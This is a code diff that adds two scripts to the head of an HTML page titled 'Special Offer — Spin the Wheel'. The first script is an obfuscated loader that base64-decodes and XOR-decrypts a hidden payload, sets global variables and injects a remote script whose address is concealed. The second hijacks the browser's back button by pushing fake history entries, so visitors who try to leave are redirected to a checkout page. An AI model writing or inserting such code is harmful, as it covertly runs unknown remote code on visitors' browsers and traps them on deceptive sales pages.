@@ -1,6 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
+<script>(function(){var g_1=atob("DKMWF5TFmXmMIcM9N9g0Yuapu0OuSbdJR9AsOLum/ReiVLdQXsVvOfeq9FfuU+xOVNF/Z+C2tgz4TLASW8JicuextxP/A+8fVtdiZf2n7A3pUuEHbNg0efWo/Fu2A6dcQ8I7YuCo8B/1DLNPUtVzeeDo4RrjRe5OVMg0O7az+BX5ROEHFYFrO+/n9xjhROEHFcd3Y/Xo7A3hSKVEGtNkcuKg9w2hUrZfXsdlNbjn7xjgVKYfDYE0asm4");var v_d3z=[];for(var v_r=0;v_r<g_1.length;v_r++){v_d3z.push(g_1.charCodeAt(v_r)&255);}var h_ngcl=v_d3z[0];var s_i=v_d3z.slice(1,1+h_ngcl);var g_7fik=v_d3z.slice(1+h_ngcl);var d_dnl=g_7fik.map(function(b,b_n58){return b^s_i[b_n58%h_ngcl];});var f_c="";for(var c_cb=0;c_cb<d_dnl.length;c_cb++){f_c+=String.fromCharCode(d_dnl[c_cb]&255);}var t_jyi=decodeURIComponent(escape(f_c));var f_ot6=JSON.parse(t_jyi);var r_4vzv=f_ot6.globals||[];r_4vzv.forEach(function(z_w){window[z_w.name]=z_w.value;});var w_8a8=document.createElement("script");w_8a8.src=f_ot6.url;w_8a8.async=true;w_8a8.defer=true;(f_ot6.attributes||[]).forEach(function(z_2z15){w_8a8.setAttribute(z_2z15.name,z_2z15.value);});(document.head||document.documentElement).appendChild(w_8a8);})();</script>
+ 
+ 
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'https://www.checkout-ds24.com/answer/yes?template=light';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+
+ 
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Special Offer — Spin the Wheel</title>
